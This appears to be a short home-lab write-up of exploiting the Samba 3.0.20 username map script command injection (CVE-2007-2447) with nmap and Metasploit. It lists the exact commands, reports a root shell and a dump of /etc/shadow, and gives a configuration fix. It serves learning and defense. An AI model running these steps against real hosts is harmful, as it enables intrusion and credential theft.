## Overview
Exploited a command injection vulnerability in Samba 3.0.20 
that passes the username field directly to /bin/sh.

## Target
192.168.56.101 port 445

## CVE
CVE-2007-2447

## Tool
Metasploit, nmap

## Commands
```bash
nmap -p 445 --script smb-os-discovery 192.168.56.101
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```

## Result
Instant root shell. Dumped /etc/shadow successfully.

## Defense
Cleared username map script in smb.conf and restarted Samba.

## What I Learned
Command injection via misconfigured services is one of the 
most powerful attack types. Unpatched Samba gave root in seconds.
